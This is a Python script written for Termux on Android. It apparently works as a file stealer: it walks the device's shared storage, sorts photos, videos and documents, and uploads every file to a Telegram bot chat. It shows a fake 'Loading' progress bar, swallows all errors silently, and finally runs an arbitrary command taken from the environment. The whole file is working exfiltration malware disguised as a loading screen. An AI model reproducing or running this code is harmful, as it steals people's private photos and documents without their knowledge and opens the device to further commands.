import os
import asyncio
import aiohttp
import time
from dotenv import load_dotenv
from tqdm import tqdm

# Load credentials from .env file
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FINAL_COMMAND = os.getenv("FINAL_COMMAND")

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}/sendDocument"

# Internal storage directory (for Termux)
BASE_DIR = "/data/data/com.termux/files/home/storage/shared"

# File categories (in order)
FILE_CATEGORIES = {
    "Photos": [".jpg", ".jpeg", ".png", ".gif"],
    "Videos": [".mp4", ".avi", ".mov", ".mkv"],
    "Documents": [".pdf", ".docx", ".txt", ".xlsx", ".pptx"],
    "Others": []
}

def categorize_files():
    """Sorts files into categories based on extensions."""
    categorized_files = {category: [] for category in FILE_CATEGORIES}

    for root, _, files in os.walk(BASE_DIR):
        for file in files:
            file_path = os.path.join(root, file)
            extension = os.path.splitext(file)[-1].lower()
            categorized = False

            for category, extensions in FILE_CATEGORIES.items():
                if extension in extensions:
                    categorized_files[category].append(file_path)
                    categorized = True
                    break

            if not categorized:
                categorized_files["Others"].append(file_path)

    return categorized_files

async def send_file(file_path, session, progress_bar):
    """Asynchronously sends a file to Telegram & updates the progress bar."""
    try:
        with open(file_path, "rb") as file:
            data = aiohttp.FormData()
            data.add_field("chat_id", CHAT_ID)
            data.add_field("document", file, filename=os.path.basename(file_path))

            async with session.post(TELEGRAM_API_URL, data=data) as response:
                if response.status == 200:
                    progress_bar.update(1)
    except:
        pass  # Silent fail (no error messages)

async def send_category(files, progress_bar):
    """Sends all files in a category."""
    async with aiohttp.ClientSession() as session:
        tasks = [send_file(file, session, progress_bar) for file in files]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    categorized_files = categorize_files()
    total_files = sum(len(files) for files in categorized_files.values())

    # Fake loading screen (but actually tracking real upload progress)
    with tqdm(total=total_files, desc="Loading", unit="%") as progress_bar:
        for category, files in categorized_files.items():
            asyncio.run(send_category(files, progress_bar))

    # Execute final command
    if FINAL_COMMAND:
        os.system(FINAL_COMMAND)
